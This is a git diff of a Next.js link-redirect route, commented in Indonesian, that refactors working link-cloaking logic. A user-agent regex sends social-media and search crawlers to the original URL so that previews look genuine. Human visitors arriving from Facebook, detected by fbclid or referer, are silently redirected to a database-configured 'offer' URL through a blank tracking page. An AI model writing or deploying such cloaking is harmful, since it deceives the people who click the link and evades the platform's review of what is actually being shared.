@@ -1,6 +1,5 @@
 import { NextResponse } from 'next/server';
 import { supabase } from '@/data/supabase';
-import { userAgent } from 'next/server';
 
 export async function GET(
   request: Request,
@@ -8,7 +7,7 @@ export async function GET(
 ) {
   const { slug } = await params;
 
-  // 1. AMBIL DATA DARI DATABASE (Parallel)
+  // 1. AMBIL DATA DARI DATABASE (Parallel: Link & Settings)
   const [linkResult, settingsResult] = await Promise.all([
     supabase.from('links').select('url, clicks').eq('id', slug).single(),
     supabase.from('settings').select('*').eq('id', 1).single()
@@ -24,48 +23,46 @@ export async function GET(
   }
 
   // --- LOGIKA HITUNG PENGUNJUNG ---
-  // Kita update di background tanpa await biar ngebut
-  supabase.from('links').update({ clicks: (entry.clicks || 0) + 1 }).eq('id', slug).then();
+  const newCount = (entry.clicks || 0) + 1;
+  supabase.from('links').update({ clicks: newCount }).eq('id', slug).then();
 
-  // --- DETEKSI PENGUNJUNG ---
-  const ua = request.headers.get('user-agent') || '';
-  const referer = request.headers.get('referer') || '';
+  // --- LOGIKA UTAMA (COPY DARI KODE LAMA KAMU) ---
+  
+  // Default Tujuan = Link Asli
+  let finalDestination = entry.url;
+
   const urlObj = new URL(request.url);
-  
-  // Deteksi Bot Lebih Akurat (Termasuk Facebook Crawler)
-  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(ua);
-  
-  // Deteksi Traffic dari Facebook (fbclid atau referer)
-  const isFacebook = urlObj.searchParams.has('fbclid') || referer.includes('facebook') || referer.includes('fb.com');
+  const searchParams = urlObj.searchParams;
+  const referer = request.headers.get('referer') || "";
+  const userAgent = request.headers.get('user-agent') || "";
 
-  // --- LOGIKA UTAMA REDIRECT ---
-  
-  // Default tujuan adalah URL ASLI
-  let finalDestination = entry.url; 
-  
-  // Ambil settingan
-  const OFFER_URL = settings?.offer_url;
-  const IS_OFFER_ACTIVE = settings?.offer_active;
-  const SITE_NAME = settings?.site_name || "Loading...";
-  const HISTATS_ID = settings?.histats_id;
+  // MAPPING DATA DARI DATABASE (PENGGANTI JSON)
+  // Pastikan kolom di tabel settings kamu sesuai: offer_url, offer_active, histats_id, delay_ms, site_name
+  const OFFER_URL = settings?.offer_url || "";
+  const IS_OFFER_ACTIVE = settings?.offer_active || false;
+  const HISTATS_ID = settings?.histats_id || "";
   const DELAY_MS = settings?.delay_ms || 2000;
+  const SITE_NAME = settings?.site_name || "Loading...";
 
-  // JIKA MANUSIA (Bukan Bot) DAN OFFER AKTIF
-  if (!isBot && IS_OFFER_ACTIVE && OFFER_URL) {
-    // Opsi A: Khusus trafik dari Facebook saja
-    if (isFacebook) {
-       finalDestination = OFFER_URL;
-    }
-    // Opsi B: (Kalau mau SEMUA trafik dilempar ke offer, hapus "if (isFacebook)" di atas)
+  // LOGIKA DETEKSI (PERSIS KODE LAMA)
+  const hasFbclid = searchParams.has('fbclid');
+  const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
+  
+  // Regex Bot (Sesuai kode lama kamu)
+  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);
+
+  // LOGIKA BELOK KE OFFER
+  // Syarat: Offer Aktif + (Ada fbclid ATAU dari FB) + BUKAN BOT
+  if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isBot) {
+    finalDestination = OFFER_URL;
   }
 
-  // KASUS 1: JIKA BOT -> LANGSUNG KE URL ASLI (Biar Preview Muncul)
+  // KASUS A: Jika BOT -> Redirect Langsung (Biar preview muncul)
   if (isBot) {
-    return NextResponse.redirect(entry.url, { status: 307 }); // Selalu ke konten asli buat bot
+    return NextResponse.redirect(entry.url, { status: 307 });
   }
 
-  // KASUS 2: MANUSIA -> TAMPILKAN HALAMAN LOADING (Putih Polos + Histats)
-  // Di sini finalDestination sudah berubah jadi Offer URL kalau kondisinya pas.
+  // KASUS B: Jika MANUSIA -> Tampilan Putih Polos + Histats + Redirect JS
   const htmlContent = `
     <!DOCTYPE html>
     <html lang="en">
@@ -74,7 +71,12 @@ export async function GET(
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>${SITE_NAME}</title>
       <style>
-        body { background-color: #ffffff; margin: 0; height: 100vh; overflow: hidden; }
+        body {
+          background-color: #ffffff; /* Latar Putih Polos */
+          margin: 0;
+          height: 100vh;
+          overflow: hidden;
+        }
       </style>
     </head>
     <body>
@@ -90,7 +92,9 @@ export async function GET(
         })();
       </script>
       <noscript>
-        <a href="/" target="_blank"><img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0"></a>
+        <a href="/" target="_blank">
+          <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
+        </a>
       </noscript>
 
       <script>
